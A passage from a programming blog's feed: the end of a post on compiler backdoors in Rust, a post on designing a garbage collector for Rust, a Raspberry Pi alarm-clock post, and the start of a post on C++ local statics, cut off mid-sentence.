so that they can reupload tampered binaries when they want. Now, cleaning up after these attacks is
easier than trusting trust, but ultimately this is like comparing being at the epicenter of Little
Boy or the Tsar Bomba &ndash; one is worse, but you&rsquo;re atomized regardless, and your mitigation plan
shouldn&rsquo;t need to change.</p>

<p>But it&rsquo;s certainly an interesting attack, and should be something we should at least be thinking
about.</p>

<p><em>Thanks to Josh Matthews, Michael Layzell, Diane Hosfelt, Eevee, and Yehuda Katz for reviewing drafts of this post.</em></p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=13091941">HN</a>, <a href="https://www.reddit.com/r/rust/comments/5g5hib/reflections_on_rusting_trust/">Reddit</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Of course, <em>this</em> raises the question of whether or not your assembler/OS/loader/processor is backdoored. Ultimately, you have to trust <em>someone</em>, which was partly the point of Thompson&rsquo;s talk.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>The AST turns up in the metadata/debuginfo/error messages, can be inspected from the command line, and in general is very far upstream and affects a number of things (all the other stages in the pipeline). You could write code to strip it out from these during inspection and only have it turn up in the binary, but that is much harder.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>The local variable is called <code>krate</code> because <code>crate</code> is a keyword<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>Stage 1 takes the downloaded (older) rust compiler and compiles the sources from it. The stage 2 compiler is build when the stage 1 compiler (which is a &ldquo;new&rdquo; compiler) is used to compile the sources again.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>Using it on the <code>fold_crate</code> call requires enabling the &ldquo;attributes on statements&rdquo; feature, but that&rsquo;s no big deal &ndash; we&rsquo;re only using the cfgs to be able to test easily; this feature won&rsquo;t actually be required if we use our stage1 compiler to compile a clean clone of the sources.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
<li id="fn:6">
<p>The numbering of the stages is a bit confusing. During &ldquo;stage 0&rdquo; (<code>cfg(stage0)</code>), the stage 1 compiler is <em>built</em>. Since you are building the stage 1 compiler, the make invocation is <code>make rustc-stage1</code>. Similarly, during stage 1, the stage 2 compiler is built, and the invocation is <code>make rustc-stage2</code> but you use <code>#[cfg(stage1)]</code> in the code.<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Designing a GC in Rust]]></title>
    <link href="http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust/"/>
    <updated>2015-09-01T01:23:40-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust</id>
    <content type="html"><![CDATA[<p>For a while I&rsquo;ve been working on a <a href="http://github.com/Manishearth/rust-gc/">garbage collector for Rust</a> with <a href="http://github.com/mystor">Michael
Layzell</a>. I thought this would be a good time to talk of our design and progress so far.</p>

<h1>Motivation</h1>

<p>&ldquo;Wait&rdquo;, you ask, &ldquo;why does Rust need a garbage collector&rdquo;? Rust is supposed to work <em>without</em> a GC,
that&rsquo;s one of its main selling points!</p>

<p>True. Rust <em>does</em> work pretty well without a GC. It&rsquo;s managed to do without one so far, and we still
have all sorts of well-written crates out there (none of which use a GC).</p>

<p>But Rust is not just about low-cost memory safety. It&rsquo;s also <a href="http://manishearth.github.io/blog/2015/05/27/wrapper-types-in-rust-choosing-your-guarantees/">about choosing your costs and
guarantees</a>. <code>Box&lt;T&gt;</code> and stack allocation are not always sufficient, sometimes one needs to
reach for something like <code>Rc&lt;T&gt;</code> (reference counting). But even <code>Rc</code> is not perfect; it can&rsquo;t handle
cycles between pointers. There are solutions to that issue like using <code>Weak&lt;T&gt;</code>, but that only works
in limited cases (when you know what the points-to graph looks like at compile time), and isn&rsquo;t very
ergonomic.</p>

<p>Cases where one needs to maintain a complicated, dynamic graph are where a GC becomes useful.
Similarly, if one is writing an interpreter for a GCd language, having a GC in Rust would simplify
things a lot.</p>

<p>Not to say that one should pervasively use a GC in Rust. Similar to <code>Rc&lt;T&gt;</code>, it&rsquo;s best to use
regular ownership-based memory management as much as possible, and sprinkle <code>Rc</code>/<code>Gc</code> in places
where your code needs it.</p>

<h1>Previous designs</h1>

<p>This isn&rsquo;t the first GC in Rust. Automatic memory management has existed before in various forms,
but all were limited.</p>

<p>Besides the ones listed below, Nick Fitzgerald&rsquo;s <a href="https://github.com/fitzgen/bacon-rajan-cc">cycle collector</a> based on <a href="researcher.watson.ibm.com/researcher/files/us-bacon/Bacon01Concurrent.pdf">this paper</a>
exists and is something that you should look into if you&rsquo;re interested. There&rsquo;s also <a href="https://github.com/pliniker/mo-gc/blob/master/doc/Project-RFC.md">an RFC</a>
by Peter Liniker which sketches out a design for an immutable GC.</p>

<h2>Core Rust GC(s)</h2>

<p>Rust itself had a garbage collector until a bit more than a year ago. These &ldquo;managed pointers&rdquo;
(<code>@T</code>) were part of the language. They were removed later with a plan to make GC a library feature.</p>

<p>I believe these were basically reference counted (cycle collected?) pointers with some language
integration, but I&rsquo;m not sure.</p>

<p>Nowadays, the only form of automatic memory management in Rust are via <a href="http://doc.rust-lang.org/alloc/rc/struct.Rc.html"><code>Rc</code></a> and <a href="http://doc.rust-lang.org/std/sync/struct.Arc.html"><code>Arc</code></a>
which are nonatomic and atomic reference counted pointers respectively. In other words, they keep
track of the number of shared references via a reference count (incremented when it is cloned,
decremented when destructors run). If the reference count reaches zero, the contents are cleaned up.</p>

<p>This is a pretty useful abstraction, however, as mentioned above, it doesn&rsquo;t let you create cycles
without leaking them.</p>

<h2>Spidermonkey</h2>

<p><em>You can read more about Servo&rsquo;s Spidermonkey bindings <a href="https://blog.mozilla.org/research/2014/08/26/javascript-servos-only-garbage-collector/">in this blog post</a> (somewhat
outdated, but still relevant)</em></p>

<p>In Servo we use <a href="http://github.com/servo/rust-mozjs/">bindings to the Spidermonkey Javascript engine</a>. Since Javascript is a
garbage collected language, the Rust representations of Javascript objects are also garbage
collected.</p>

<p>Of course, this sort of GC isn&rsquo;t really useful for generic use since it comes bundled with a JS
runtime. However, the Rust side of the GC is of a design that could be used in an independent
library.</p>

<p>The Rust side of the Spidermonkey GC is done through a bunch of smart pointers, and a trait called
<code>JSTraceable</code>. <code>JSTraceable</code> is a trait which can &ldquo;trace&rdquo; recursively down some data, finding and
marking all GC-managed objects inside it. This is autoderived using Rust&rsquo;s plugin infrastructure, so
a simple <code>#[jstraceable]</code> annotation will generate trace hooks for the struct it is on.</p>

<p>Now, we have various smart pointers. The first is <code>JS&lt;T&gt;</code>. This is opaque, but can be held by other
GC-managed structs. To use this on the stack, this must be explicitly <em>rooted</em>, via <code>.root()</code>. This
produces a <code>Root&lt;T&gt;</code>, which can be dereferenced to get the inner object. When the <code>Root</code> is created,
the contained object is listed in a collection of &ldquo;roots&rdquo; in a global. A root indicates that the
value is being used on the stack somewhere, and the GC starts tracing usage from these roots. When
the <code>Root&lt;T&gt;</code> is destroyed, the root is removed.</p>

<p>The problem with this is that <code>JS&lt;T&gt;</code> doesn&rsquo;t work on the stack. There is no way for the GC to know
that we are holding on to <code>JS&lt;T&gt;</code> on the stack. So, if I copy a <code>JS&lt;T&gt;</code> to the stack, remove all
references to it from objects in the GC heap, and trigger a collection, the <code>JS&lt;T&gt;</code> will still be
around on the stack after collection since the GC can&rsquo;t trace to it. If I attempt to root it, I may
get a panic or a segfault depending on the implementation.</p>

<p>To protect against this, we have a bunch of lints. The <a href="https://github.com/servo/servo/blob/master/components/plugins/lints/unrooted_must_root.rs">relevant one</a> here protects
against <code>JS&lt;T&gt;</code> from being carried around on the stack; but like most lints, it&rsquo;s not perfect.</p>

<p>To summarize: Spidermonkey gives us a good GC. However using it for a generic Rust program is ill
advised. Additionally, Servo&rsquo;s wrappers around the GC are cheap, but need lints for safety. While it
would probably be possible to write safer wrappers for general usage, it&rsquo;s pretty impractical to
carry around a JS runtime when you don&rsquo;t need one.</p>

<p>However, Spidermonkey&rsquo;s GC did inspire me to think more into the matter.</p>

<h1>Brainstorming a design</h1>

<p>For quite a while I&rsquo;d had various ideas about GCs. Most were simplifications of Servo&rsquo;s wrappers
(there&rsquo;s some complexity brought in there by Spidermonkey that&rsquo;s not necessary for a general GC).
Most were tracing/rooting with mark-and-sweep collection. All of them used lints. Being rather busy,
I didn&rsquo;t really work on it past that, but planned to work on it if I could find someone to work
with.</p>

<p>One day, <a href="http://github.com/mystor">Michael</a> pinged me on IRC and asked me about GCs. Lots of people knew that I was
interested in writing a GC for Rust, and one of them directed him to me when he expressed a similar
interest.</p>

<p>So we started discussing GCs. We settled on a tracing mark-and-sweep GC. In other words, the GC runs
regular &ldquo;sweeps&rdquo; where it first &ldquo;traces&rdquo; the usage of all objects and marks them and their children
as used, and then sweeps up all unused objects.</p>

<p>This model on its own has a flaw. It doesn&rsquo;t know about GC pointers held on the stack as local
variables (&ldquo;stack roots&rdquo;). There are multiple methods for solving this. We&rsquo;ve already seen one above
in the Spidermonkey design &ndash; maintain two types of pointers (one for the stack, one for the heap),
and try very hard using static analysis to ensure that they don&rsquo;t cross over.</p>

<p>A common model (used by GCs like Boehm, called &ldquo;conservative GCs&rdquo;) is to do something called &ldquo;stack
scanning&rdquo;. In such a system, the GC goes down the stack looking for things which may perhaps be GC
pointers. Generally the GC allocates objects in known regions of the memory, so a GC pointer is any
value on the stack which belongs to one of these regions.</p>

<p>Of course, this makes garbage collection rather inefficient, and will miss cases like <code>Box&lt;Gc&lt;T&gt;&gt;</code>
where the GCd pointer is accessible, but through a non-GC pointer.</p>

<p>We decided rather early on that we didn&rsquo;t want a GC based on lints or stack scanning. Both are
rather suboptimal solutions in my opinion, and very hard to make sound<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. We were also hoping that
Rust&rsquo;s type system and ownership semantics could help us in designing a good, safe, API.</p>

<p>So, we needed a way to keep track of roots, and we needed a way to trace objects.</p>

<h2>Tracing</h2>

<p>The latter part was easy. We wrote a compiler plugin (well, we stole <a href="https://github.com/servo/servo/blob/master/components/plugins/jstraceable.rs#L38">Servo&rsquo;s tracing plugin which
I&rsquo;d written earlier</a>) which autoderives an implementation of the <code>Trace</code> trait on any
given struct or enum, using the same internal infrastructure that <code>#[derive(PartialEq)]</code> and the
rest use. So, with just the following code, it&rsquo;s easy to make a struct or enum gc-friendly:</p>

<pre><code class="rust">#[derive(Trace)]
struct Foo {
    x: u8,
    y: Bar,
}

#[derive(Trace)]
enum Bar {
    Baz(u8), Quux
}
</code></pre>

<p>For a <code>foo</code> of type <code>Foo</code> <code>foo.trace()</code>, will expand to a call of <code>foo.x.trace()</code> and
<code>foo.y.trace()</code>. <code>bar.trace()</code> will check which variant it is and call <code>trace()</code> on the <code>u8</code> inside
if it&rsquo;s a <code>Baz</code>. For most structs this turns out to be a no-op and is often optimized away by
inlining, but if a struct contains a <code>Gc&lt;T&gt;</code>, the special implementation of <code>Trace</code> for <code>Gc&lt;T&gt;</code> will
&ldquo;mark&rdquo; the traceability of the <code>Gc&lt;T&gt;</code>. Types without <code>Trace</code> implemented cannot be used in types
implementing <code>Trace</code> or in a <code>Gc</code>, which is enforced with a <code>T: Trace</code> bound on <code>Gc&lt;T&gt;</code>.</p>

<p>So, we have a way of walking the fields of a given object and finding inner <code>Gc&lt;T&gt;</code>s. Splendid. This
lets us write the mark&amp;sweep phase easily: Take the list of known reachable <code>Gc&lt;T&gt;</code>s, walk their
contents until you find more <code>Gc&lt;T&gt;</code>s (marking all you find), and clean up any which aren&rsquo;t
reachable.</p>

<h2>Rooting</h2>

<p>Of course, now we have to solve the problem of keeping track of the known reachable <code>Gc&lt;T&gt;</code>s, i.e.
the roots. This is a hard problem to solve without language support, and I hope that eventually we
might be able to get the language hooks necessary to solve it. LLVM <a href="http://llvm.org/docs/GarbageCollection.html#gcroot">has support for tracking
GCthings on the stack</a>, and some day we may be able to leverage that in Rust.</p>

<p>As noted above, Spidermonkey&rsquo;s solution was to have non-rooted (non-dereferencable) heap pointers,
which can be explicitly converted to rooted pointers and then read.</p>

<p>We went the other way. All <code>Gc&lt;T&gt;</code> pointers, when created, are considered &ldquo;rooted&rdquo;. The instance of
<code>Gc&lt;T&gt;</code> has a &ldquo;rooted&rdquo; bit set to true, and the underlying shared box (<code>GcBox</code>, though this is not a
public interface) has its &ldquo;root count&rdquo; set to one.</p>

<p>When this <code>Gc&lt;T&gt;</code> is cloned, an identical <code>Gc&lt;T&gt;</code> (with rooted bit set to true) is returned, and the
underlying root count is incremented. Cloning a <code>Gc</code> does not perform a deep copy.</p>

<pre><code class="rust">let a = Gc::new(20); // a.root = true, (*a.ptr).roots = 1, (*a.ptr).data = 20

// ptr points to the underlying box, which contains the data as well as
// GC metadata like the root count. `Gc::new()` will allocate this box

let b = a.clone(); // b.root = true, (*a.ptr).roots++, b.ptr = a.ptr
</code></pre>

<p>This is rather similar to how <code>Rc</code> works, however there is no <code>root</code> field, and the <code>roots</code> counter
is called a &ldquo;reference counter&rdquo;.</p>

<p>For regular local sharing, it is recommended to just use a borrowed reference to the inner variable
(borrowing works fine with rust-gc!) since there is no cost to creating this reference.</p>

<p>When a GC thing is put inside another GC thing, the first thing no longer can remain a root. This is
handled by &ldquo;unrooting&rdquo; the first GC thing:</p>

<pre><code class="rust">struct Foo {
    bar: u32,
    baz: Gc&lt;u32&gt;,
}

let a = Gc::new(20); // why anyone would want to GC an integer I'll never know
                     // but I'll stick with this example since it's simple

let b = Gc::new(Foo {bar: 1, baz: a});
// a.root = false, (*a.ptr).roots--
// b initialized similar to previous example

// `a` was moved into `b`, so now `a` cannot be accessed directly here
// other than through `b`, and `a` is no longer a root.
// To avoid moving a, passing `a.clone()` to `b` will work
</code></pre>

<p>Of course, we need a way to traverse the object passed to the <code>Gc&lt;T&gt;</code>, in this case <code>Foo</code>, and look
for any contained <code>Gc&lt;T&gt;</code>s to unroot. Sound familiar? This needs the same mechanism that <code>trace()</code>
needed! We add struct-walking <code>root()</code> and <code>unroot()</code> methods to the <code>Trace</code> trait which are auto-
derived exactly the same way, and continue. (We don&rsquo;t need <code>root()</code> right now, but we will need it
later on).</p>

<p>Now, during collection, we can just traverse the list of <code>GcBox</code>s and use the ones with a nonzero
root count as roots for our mark traversal.</p>

<p>So far, so good. We have a pretty sound design for a GC that works &hellip; for immutable data.</p>

<h3>Mutability</h3>

<p>Like <code>Rc&lt;T&gt;</code>, <code>Gc&lt;T&gt;</code> is by default immutable. Rust abhors aliasable mutability, <a href="http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability/">even in single
threaded contexts</a>, and both these smart pointers allow aliasing.</p>

<p>Mutation poses a problem for our GC, beyond the regular problems of aliasable mutability: It&rsquo;s
possible to move rooted things into heap objects and vice versa:</p>

<pre><code class="rust">let x = Gc::new(20);

let y = Gc::new(None);

*y = Some(x); // uh oh, x is still considered rooted!

// and the reverse!

let y = Gc::new(Some(Gc::new(20)));

let x = y.take(); // x was never rooted!
// `take()` moves the `Some(Gc&lt;u32&gt;)` out of `y`, replaces it with `None`       
</code></pre>

<p>Since <code>Gc&lt;T&gt;</code> doesn&rsquo;t implement <code>DerefMut</code>, none of this is possible &mdash; one cannot mutate the
inner data. This is one of the places where Rust&rsquo;s ownership/mutability system works out awesomely
in our favor.</p>

<p>Of course, an immutable GC isn&rsquo;t very useful. We can&rsquo;t even create cycles in an immutable GC, so why
would anyone need this in the first place<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>?</p>

<p>So of course, we needed to make it somehow mutable. People using <code>Rc&lt;T&gt;</code> solve this problem by using
<code>RefCell&lt;T&gt;</code>, which maintains something similar to the borrow semantics at runtime and is internally
mutable. <code>RefCell&lt;T&gt;</code> itself can&rsquo;t be used by us since it doesn&rsquo;t guard against the problem
illustrated above (and hence won&rsquo;t implement <code>Trace</code>, but a similar cell type would work).</p>

<p>So we created <code>GcCell&lt;T&gt;</code>. This behaves just like <code>RefCell&lt;T&gt;</code>, except that it will <code>root()</code> before
beginning a mutable borrow, and <code>unroot()</code> before ending it (well, only if it itself is not rooted,
which is tracked by an internal field similar to <code>Gc&lt;T&gt;</code>). Now, everything is safe:</p>

<pre><code class="rust">#[derive(Trace)]
struct Foo {
    a: u8,
    b: GcCell&lt;Gc&lt;u8&gt;&gt;,
}

let x = Gc::new(20);

let y = Gc::new(Foo {a: 10, b: Gc::new(30)});
{
    *y.b.borrow_mut() = x; // the `Gc(30)` from `y.b` was rooted by this call
                           // but since we don't actually use it here,
                           // the destructor gets rid of it.
                           // We could use swap() to retain access to it.
    // ...
    // x unrooted
}


// and the reverse case works too:

let y = Gc::new(GcCell::new(Some(Gc::new(20))));

let x = y.borrow_mut().take(); // the inner `Some(Gc(20))` gets rooted by `borrow_mut()`
                               // before `x` can access it
</code></pre>

<p>So now, mutation works too! We have a working garbage collector!</p>

<h1>Open problems</h1>

<h2>Destructors</h2>

<p>I believe this can be solved without lints, but it <em>may</em> require some upcoming features of Rust to
be implemented first (like specialization).</p>

<p>In essence, destructors implemented on a value inside <code>Gc&lt;T&gt;</code> can be unsafe. This will only happen
if they try to access values within a <code>Gc&lt;T&gt;</code> &mdash; if they do, they may come across a box that
has already been collected, or they may lengthen the lifetime of a box scheduled to be collected.</p>

<p>The basic solution to this is to use &ldquo;finalizers&rdquo; instead of destructors. Finalizers, like in Java,
are not guaranteed to run. However, we may need further drop hooks or trait specialization to make
an airtight interface for this. I don&rsquo;t have a concrete design for this yet, though.</p>

<h2>Concurrency</h2>

<p>Our model mostly just works in a concurrent situation (with thread safety tweaks, of course); in
fact it&rsquo;s possible to make it so that the concurrent GC will not &ldquo;stop the world&rdquo; unless someone
tries to do a write to a <code>GcCell</code>. We have an experimental concurrent GC in <a href="https://github.com/Manishearth/rust-gc/pull/6">this pull
request</a>. We still need to figure out how to make interop between both GCs safe, though we may
just end up making them such that an object using one GC cannot be fed to an object using the other.</p>

<h2>Performance</h2>

<p>So far we haven&rsquo;t really focused on performance, and worked on ensuring safety. Our collection
triggering algorithm, for example, was horribly inefficient, though we planned on improving it. The
wonderful Huon <a href="https://github.com/Manishearth/rust-gc/pull/9">fixed this</a>, though.</p>

<p>Similarly, we haven&rsquo;t yet optimized storage. We have some ideas which we may work on later. (If you
want to help, contributions welcome!)</p>

<h2>Cross-crate deriving</h2>

<p>Currently, an object deriving <code>Trace</code> should have <code>Trace</code>able children. This isn&rsquo;t always possible
when members from another crate (which does not depend on rust-gc) are involved. At the moment, we
allow an <code>#[unsafe_ignore_trace]</code> annotation on fields which are of this type (which excludes it
from being traced &ndash; if that crate doesn&rsquo;t transitively depend on rust-gc, its members cannot
contain GCthings anyway unless generics are involved). It should be possible to detect whether or
not this is safe, and/or autoderive <code>Trace</code> using the opt-in builtin traits framework (needs
specialization to work), but at the moment we don&rsquo;t do anything other than expose that annotation.</p>

<p>Stdlib support for a global <code>Trace</code> trait that everyone derives would be awesome.</p>

<h1>Conclusion</h1>

<p>Designing a GC was a wonderful experience! I didn&rsquo;t get to write much code (I was busy and Michael
was able to implement most of it overnight because he&rsquo;s totally awesome), but the long design
discussions followed by trying to figure out holes in the GC design in every idle moment of the day
were quite enjoyable. GCs are very hard to get right, but it&rsquo;s very satisfying when you come up with
a design that works! I&rsquo;m also quite happy at how well Rust helped in making a safe interface.</p>

<p>I encourage everyone to try it out and/or find holes in our design. Contributions of all kind
welcome, we&rsquo;d especially love performance improvements and testcases.</p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=10148471">HN</a>, <a href="https://www.reddit.com/r/rust/comments/3j4bx2/designing_a_gc_in_rust/">Reddit</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>I&rsquo;m very skeptical that it&rsquo;s possible to make either of these completely sound without writing lints which effectively rewrite a large chunk of the compiler<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>There is a case to be made for an immutable GC which allows some form of deferred initialization of GC fields, however.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The World's Most Over-engineered Alarm Clock]]></title>
    <link href="http://manishearth.github.io/blog/2015/08/29/the-worlds-most-over-engineered-alarm-clock/"/>
    <updated>2015-08-29T01:08:59-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/08/29/the-worlds-most-over-engineered-alarm-clock</id>
    <content type="html"><![CDATA[<p>A few weeks ago, I set up my Raspberry Pi as a music server so that I could listen to music without
having to deal with keeping my laptop in a certain corner of the room.</p>

<p>After setting it all up, it occurred to me: &ldquo;I can do much more with this!&rdquo;.</p>

<p>Waking up to go to class in the morning is always a challenge for me. It&rsquo;s not that I don&rsquo;t wake up
&mdash; I often wake up, cancel all the alarms, and go back to bed. Half-asleep me somehow has the
skill to turn off alarms, but not the discipline of going to class<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. I&rsquo;ve tried those apps that
make you do math before you can cancel the alarm, and I&rsquo;m able to do the math and go back to sleep
without fully waking up in the process (Hey, I&rsquo;m a physics student; math is what we do!).</p>

<p>So I decided to create an alarm clock. Not just any alarm clock, the most overengineered alarm clock
I can think of.</p>

<p>It consists of the Pi connected to a speaker and kept in a hard-to-reach area of the room. The Pi is
on a DHCP network. Every night, I ssh to the Pi, set the volume to full, and run a script which,
using <code>at</code> and <code>mpg123</code>, will schedule jobs to run around the desired time of waking up. First,
there will be a few pieces of soothing music (either violin music or parts of the <em>Interstellar</em>
OST) run once or twice, a while before the time of waking up. Close to the time of waking up, there
are a bunch of jobs where each one will run a string of annoying music. In my case, it&rsquo;s the
Minions&#8217; banana song followed by Nyan Cat (I sometimes add more to this list).</p>

<p>So far so good.</p>

<p>Now, the soothing music gives asleep-me me a chance to surrender and wake up <em>before</em> the Nyan Cat
begins, and often fear of Nyan Cat is a pretty good motivator to wake up. If I don&rsquo;t wake up to
the soft songs, the annoying ones invariably work.</p>

<p>At this stage I&rsquo;m still pretty groggy and have the intense urge to go back to bed. However, turning
off the alarm isn&rsquo;t simple. Since it&rsquo;s in a hard to reach area of the room, I can&rsquo;t just turn it
off. I need to get up, sit in my chair, and turn on the laptop (which is hibernated/suspended), and
kill it via ssh.</p>

<p>This needs me to:</p>

<ul>
<li><code>nmap</code> the network to find the Pi (I&rsquo;m the only one on this subnet who uses <code>ssh</code>, so this just needs a port filter)</li>
<li><code>ssh</code> into the Pi, remembering the password (I haven&rsquo;t done this yet but I could further complicate things by changing the password often to reduce muscle-memory)</li>
<li><code>killall mpg123</code> to kill the currently playing song</li>
<li>Cancel the remaining <code>at</code> jobs. This can be done with <code>atq</code> + <code>atrm</code> for every job (tedious and long), or with <code>awk</code>. If I&rsquo;ve already fully woken up, I&rsquo;m able to do the <code>awk</code> one, otherwise half-asleep me ends up doing the brute-force one, which is enough manual typing to shake the remaining bits of sleepiness off.</li>
</ul>


<p>After this whole process, it&rsquo;s pretty much guaranteed that I&rsquo;m fully awake &ndash; there&rsquo;s no going back now!</p>

<p>So far it&rsquo;s worked pretty well (both when I&rsquo;ve slept on time and when I haven&rsquo;t). The first ten minutes after this I&rsquo;m rather annoyed, but after that I&rsquo;m happy I woke up. If half-asleep me
eventually gets the muscle memory to get past this process, I should probably be able to tweak it
to add more complexity or change the way it works.</p>

<p>Of course, having an arms race with oneself probably isn&rsquo;t the best way to solve this problem. I
suspect I&rsquo;ll go back to regular alarms in a month or so, but it&rsquo;s a fun experiment for now.</p>

<p>However, by the time I&rsquo;m done with this alarm clock, I&rsquo;ll either be waking up on time, or I&rsquo;ll be
able to Linux in my sleep, which is a win-win!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>As a fourth year student the fully-awake me also has a bit of trouble with this ;)<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Adventures in Systems Programming: C++ Local Statics]]></title>
    <link href="http://manishearth.github.io/blog/2015/06/26/adventures-in-systems-programming-c-plus-plus-local-statics/"/>
    <updated>2015-06-26T16:32:06-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/06/26/adventures-in-systems-programming-c-plus-plus-local-statics</id>
    <content type="html"><![CDATA[<p>For a while now I&rsquo;ve been quite interested in compilers and systems programming in general; and I
feel that an important feature of systems programming is that it&rsquo;s relatively easy to figure out
what a line of code does (modulo optimizations) at the OS or hardware level<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Conversely, it&rsquo;s
important to know how your tools work more than ever in systems programming. So when I see a
language feature I&rsquo;m not familiar with, I&rsquo;m interested in finding out how it works under the hood.</p>

<p>I&rsquo;m not a C++ expert. I can work on C++ codebases, but I&rsquo;m not anywhere near knowing all of the
features and nuances of C++. However, I am pretty good at Rust and understand a decent portion of
the compiler internals. This gives me a great perspective &mdash; I&rsquo;ve not yet internalized most C++
features to take them for granted, and I&rsquo;m well equipped to investigate these features.</p>

<p>Today I came across some C++ code similar to the following<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>:</p>

<pre><code class="cpp">void foo() {
    static SomeType bar = Env()-&gt;someMethod();
    static OtherType baz = Env()-&gt;otherMethod(bar);
}
</code></pre>

<p>This code piqued my interest. Specifically, the local <code>static</code> stuff. I knew that when you have a
static like</p>

<pre><code>static int FOO = 1;
</code></pre>

<p>the <code>1</code> is stored somewhere in the <code>.data</code> section of the program. This is easily verified with <code>gdb</code>:</p>

<pre><code class="cpp">static int THING = 0xAAAA;

int main() {
 return 1;
}
</code></pre>

<pre><code class="text">$ g++ test.cpp -g
$ gdb a.out
(gdb) info addr THING
Symbol "THING" is static storage at address 0x601038.
(gdb) info symbol 0x601038
THING in section .data
</code></pre>

<p>This is basically a part of the compiled program as it is loaded into memory.</p>

<p>Similarly, when you have a <code>static</code> that is initialized with a function, it&rsquo;s stored in the <code>.bss</code>
section, and initialized before <code>main()</code>. Again, easily verified:</p>

<pre><code class="cpp">#include&lt;iostream&gt;
using namespace std;

int bar() {
 cout&lt;&lt;"bar called\n";
 return 0xFAFAFA;
}

static int THING = bar();

int main() {
 cout&lt;&lt;"main called\n";
 return 0;
}
</code></pre>

<pre><code class="text">$ ./a.out 
bar called
main called
$ gdb a.out
(gdb) info addr THING
Symbol "THING" is static storage at address 0x601198.
(gdb) info symbol 0x601198
THING in section .bss
</code></pre>

<p>We can also leave statics uninitialized (<code>static int THING;</code>) and they will be placed in <code>.bss</code><sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>.</p>

<p>So far so good.</p>

<p>Now back to the original snippet:</p>

<pre><code class="cpp">void foo() {
    static SomeType bar = Env()-&gt;someMethod();
    static OtherType baz = Env()-&gt;otherMethod(bar);
}
</code></pre>

<p>Naïvely one might say that these are statics which are scoped locally to avoid name clashes. It&rsquo;s
not much different from <code>static THING = bar()</code> aside from the fact that it isn&rsquo;t a global
identifier.</p>

<p>However, this isn&rsquo;t the case. What tipped me off was that this called <code>Env()</code>, and I wasn&rsquo;t so sure
that the environment was guaranteed to be properly initialized and available before <code>main()</code> is
called <sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup>.</p>

<p>Instead, these are statics which are initialized the first time the function is called.</p>

<pre><code class="cpp">#include&lt;iostream&gt;
using namespace std;

int bar() {
 cout&lt;&lt;"bar called\n";
 return 0xFAFAFA;
}

void foo() {
 cout&lt;&lt;"foo called\n";
 static int i = bar();
 cout&lt;&lt;"Static is:"&lt;&lt; i&lt;&lt;"\n";
}

int main() {
 cout&lt;&lt;"main called\n";
 foo();
 foo();
 foo();
 return 0;
}
</code></pre>

<pre><code class="text">$ g++ test.cpp
$ ./a.out
main called
foo called
bar called
Static is:16448250
foo called
Static is:16448250
foo called
Static is:16448250
</code></pre>

<p>Wait, &ldquo;the first time the function is called&rdquo;? <em>Alarm bells go off&hellip;</em> Surely there&rsquo;s some cost to that! Let&rsquo;s investigate.</p>

<pre><code class="text">$ gdb a.out
(gdb) disas bar
   // snip
   0x0000000000400c72 &lt;+15&gt;:    test   %al,%al
   0x0000000000400c74 &lt;+17&gt;:    jne    0x400ca4 &lt;_Z3foov+65&gt;
   0x0000000000400c76 &lt;+19&gt;:    mov    $0x6021f8,%edi
   0x0000000000400c7b &lt;+24&gt;:    callq  0x400a00 &lt;__cxa_guard_acquire@plt&gt;
   0x0000000000400c80 &lt;+29&gt;:    test   %eax,%eax
   0x0000000000400c82 &lt;+31&gt;:    setne  %al
   0x0000000000400c85 &lt;+34&gt;:    test   %al,%al
   0x0000000000400c87 &lt;+36&gt;:    je     0x400ca4 &lt;_Z3foov+65&gt;
   0x0000000000400c89 &lt;+38&gt;:    mov    $0x0,%r12d
   0x0000000000400c8f &lt;+44&gt;:    callq  0x400c06 &lt;_Z3barv&gt;
   0x0000000000400c94 &lt;+49&gt;:    mov    %eax,0x201566(%rip)        # 0x602200 &lt;_ZZ3foovE1i&gt;
   0x0000000000400c9a &lt;+55&gt;:    mov    $0x6021f8,%edi
   0x0000000000400c9f &lt;+60&gt;:    callq  0x400a80 &lt;__cxa_guard_release@plt&gt;
   0x0000000000400ca4 &lt;+65&gt;:    mov    0x201556(%rip),%eax        # 0x602200 &lt;_ZZ3foovE1i&gt;
   0x0000000000400caa &lt;+71&gt;:    mov    %eax,%esi
   0x0000000000400cac &lt;+73&gt;:    mov    $0x6020c0,%edi
   // snip
</code></pre>

<p>The instruction at <code>+44</code> calls <code>bar()</code>, and it seems to be surrounded by calls to some <code>__cxa_guard</code>
functions.</p>

<p>We can take a naïve guess at what this does: It probably just sets a hidden static flag on
initialization which ensures that it only runs once.</p>

<p>Of course, the actual solution isn&rsquo;t as simple. It needs to avoid data races, handle errors, and
